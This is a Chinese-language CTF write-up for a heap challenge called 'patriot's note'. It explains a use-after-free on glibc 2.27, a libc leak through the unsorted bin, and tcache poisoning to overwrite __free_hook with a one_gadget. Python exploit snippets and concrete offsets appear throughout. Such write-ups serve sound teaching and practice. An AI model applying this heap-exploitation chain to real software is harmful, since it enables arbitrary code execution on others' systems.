# patriot’s note

## 题目简述

菜单程序在删除笔记时调用 `free`，却没有清空保存堆指针的槽位；后续 `show` 和 `edit` 仍可访问已释放堆块，形成 Use-After-Free。目标环境使用 glibc 2.27，可以先从 unsorted bin 泄露 `main_arena`，再通过 tcache poisoning 把一次分配定向到 `__free_hook`，写入 one_gadget 并触发。

## 解题过程

第一步申请一个大于 tcache 范围的 `0x500` 堆块，再申请一个 `0x40` 隔离块，防止大块释放时与 top chunk 合并。释放大块后，它进入 unsorted bin，块内容中的 `fd`/`bk` 指向 `main_arena+96`。由于指针槽未清空，调用 `show` 可以泄露该地址：

```python
take(0x500)  # index 0
take(0x40)   # index 1，防止向后合并
delete(0)
arena_leak = u64(show(0).ljust(8, b"\x00"))
libc.address = arena_leak - (libc.sym["main_arena"] + 96)
```

若符号表没有导出 `main_arena`，应通过所用 libc 的调试符号或本地动态调试确定该偏移，不能沿用官方脚本中的某次绝对地址差。

接着申请并释放一个 `0x40` 块，使它进入对应 tcache bin。UAF 编辑已释放块的首个机器字，也就是 tcache 单链表的 `next` 指针：

```python
free_hook = libc.sym["__free_hook"]
one_gadget = libc.address + 0x4F432

take(0x40)       # index 2
delete(2)
edit(2, p64(free_hook))
take(0x40)       # 取回原块
take(0x40)       # 返回 __free_hook
edit(4, p64(one_gadget))
delete(1)        # 触发 __free_hook
```

glibc 2.27 的 tcache 链表尚未采用后续版本的 safe-linking，因此可以直接写入目标地址。官方选择的 one_gadget 偏移为 `0x4f432`，约束是 `[rsp+0x40] == NULL`；远端若使用不同 libc，偏移和约束都必须重新计算。

## 方法总结

UAF 堆题应分开建立“泄露”和“写入”两个原语：大块进入 unsorted bin 后适合泄露 libc，小块进入 tcache 后适合篡改单链表。利用成功依赖具体 glibc 版本；更新版本可能移除 `__free_hook` 或启用 safe-linking，因此 WP 中必须记录版本、bin 行为和 one_gadget 约束，而不能只保留一串硬编码地址。
